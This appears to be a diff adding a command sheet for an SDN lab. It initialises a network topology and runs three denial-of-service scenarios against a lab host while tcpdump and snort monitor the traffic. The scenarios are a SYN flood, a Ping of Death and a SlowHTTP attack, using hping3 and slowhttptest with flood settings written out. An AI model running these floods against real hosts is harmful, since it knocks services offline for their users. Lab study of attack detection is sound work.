@@ -1,0 +1,34 @@
+# Part 1: Initialize the SDN Network
+sudo python3 -m ospf_topo.py
+pingall
+
+
+# Part 2: Scenario No.1: TCP SYN Flood attack
+xterm h0r1
+	iperf -s -t 5001
+	tcpdump -i h0r1-eth0 -w cap.pcap
+	snort -i h0r1-eth0 -v -c /home/SDN/snort/snort_conf.conf
+	sudo python3 listen.py
+xterm h0r5
+	nmap 10.0.1.11
+	hping3 -S -p 5001 -i u1000 10.0.1.11
+
+
+# Part 3: Scenario No.2: Ping of Death attack
+xterm h0r1
+	tcpdump -i h0r1-eth0 -w cap.pcap
+	snort -i h0r1-eth0 -v -c /home/SDN/snort/snort_conf.conf
+	sudo python3 listen.py
+xterm h0r5
+	hping3 --icmp -d 65536 10.0.1.11 --flood
+
+
+# Part 4: Scenario No.3: SlowHTTP attack
+xterm h0r1
+	python -m SimpleHTTPServer 80
+	tcpdump -i h0r1-eth0 -w cap.pcap
+	sudo python3 listen.py
+xterm h0r2
+	wget http://10.0.1.11/
+xterm h0r5
+	slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://10.0.1.11 -x 24 -p 3 -l 60
